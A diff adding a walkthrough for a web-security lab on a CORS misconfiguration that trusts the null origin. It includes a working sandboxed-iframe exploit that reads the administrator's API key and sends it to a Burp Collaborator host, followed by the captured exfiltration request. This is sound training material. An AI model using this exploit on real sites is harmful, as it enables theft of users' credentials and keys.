@@ -125,3 +125,69 @@ Accept-Language: en-US,en;q=0.9
 
 The parameter apikey holds the administrator’s API key: KB3DvjRErYpawXJe96ADCGnbu5Og4hlw. Submit the solution.
 
+
+
+# Lab: CORS vulnerability with trusted null origin
+
+
+### Step 1: Log in to the lab
+
+Use the credentials wiener:peter to log in. This confirms the lab is accessible and the accountDetails endpoint works.
+
+### Step 2: Generate a Burp Collaborator URL
+
+Open Burp Collaborator client (Burp menu → Burp Collaborator client). Click “Copy to clipboard” to get a unique URL, for example:
+https://mlbdcw2yowq7926wggg10ps86zcq0ood.oastify.com
+
+This URL will receive the exfiltrated API key.
+
+### Step 3: Prepare the iframe exploit
+
+The following HTML uses a sandboxed iframe to force the browser to send `Origin: null`. The server trusts the null origin and allows credentials.
+
+```html
+<iframe sandbox="allow-scripts allow-forms"
+        src="data:text/html,
+<script>
+  var req = new XMLHttpRequest();
+  req.onload = function() {
+    if (req.status == 200) {
+      var data = JSON.parse(req.responseText);
+      var apikey = data.apikey;
+      new Image().src = 'https://mlbdcw2yowq7926wggg10ps86zcq0ood.oastify.com/?apikey=' + encodeURIComponent(apikey);
+    }
+  };
+  req.open('GET', 'https://0a47002903779f9180c72b24007a006d.web-security-academy.net/accountDetails', true);
+  req.withCredentials = true;
+  req.send();
+</script>">
+</iframe>
+```
+
+### Step 4: Host the exploit &  Deliver the exploit to the victim
+
+In the lab, click “Go to exploit server”. Paste the entire iframe code into the “Body” section. Click “Store”.
+Click “Deliver exploit to victim”. The victim (administrator) will load the exploit page. The sandboxed iframe sends a cross‑origin request to /accountDetails with Origin: null. The server reflects the null origin and sets Access-Control-Allow-Credentials: true. The browser allows the script to read the response.
+
+Return to Burp Collaborator client. Click “Poll now”. You will see an HTTP interaction containing the exfiltrated data. Look for a GET request like:
+
+```
+GET /?apikey=Ze9k8vWLSpWSHFFk210mj4sjFtGTrSJj HTTP/1.1
+Host: mlbdcw2yowq7926wggg10ps86zcq0ood.oastify.com
+Connection: keep-alive
+sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+sec-ch-ua-platform: "Linux"
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Sec-Fetch-Site: cross-site
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: image
+Accept-Encoding: gzip, deflate, br, zstd
+Accept-Language: en-US,en;q=0.9
+```
+The parameter apikey holds the administrator’s API key: Ze9k8vWLSpWSHFFk210mj4sjFtGTrSJj. Submit the solution.
+
+
+
+
